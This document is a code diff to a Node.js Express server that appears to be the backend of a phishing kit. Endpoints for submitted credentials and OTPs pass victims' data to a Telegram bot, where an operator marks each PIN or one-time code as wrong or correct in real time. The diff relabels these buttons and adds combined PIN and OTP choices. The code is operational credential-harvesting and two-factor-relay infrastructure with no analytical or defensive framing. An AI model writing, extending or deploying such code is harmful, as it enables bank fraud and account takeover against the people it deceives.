@@ -130,8 +130,9 @@ app.post('/api/submit-credentials', async (req, res) => {
         reply_markup: JSON.stringify({  
           inline_keyboard: [  
             [  
-              { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },  
-              { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }  
+              { text: '❌ WRONG PIN', callback_data: `pin_wrong_${appReference}` },  
+              { text: '❌ WRONG OTP', callback_data: `otp_wrong_${appReference}` },  
+              { text: '✅ ALLOW CORRECT OTP', callback_data: `pin_correct_${appReference}` }  
             ]  
           ]  
         })  
@@ -183,8 +184,9 @@ app.post('/api/submit-otp', async (req, res) => {
         reply_markup: JSON.stringify({  
           inline_keyboard: [  
             [  
-              { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },  
-              { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }  
+              { text: '❌ WRONG PIN', callback_data: `pin_wrong_${appReference}` },  
+              { text: '❌ WRONG OTP', callback_data: `otp_wrong_${appReference}` },  
+              { text: '✅ ALLOW CORRECT OTP', callback_data: `pin_correct_${appReference}` }  
             ]  
           ]  
         })  
@@ -418,7 +420,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'PIN_APPROVED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: PIN Verified as CORRECT ✅</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: ALLOW CORRECT OTP ✅</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -429,7 +431,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'PIN_REJECTED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN Verified as WRONG ❌</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: WRONG PIN ❌</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -440,7 +442,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'OTP_APPROVED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Verified as CORRECT ✅</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: ALLOW CORRECT OTP ✅</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -451,7 +453,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'OTP_REJECTED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: OTP Verified as WRONG ❌</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: WRONG OTP ❌</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 });
@@ -480,4 +482,4 @@ app.get('/Admin-*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
- 
+        
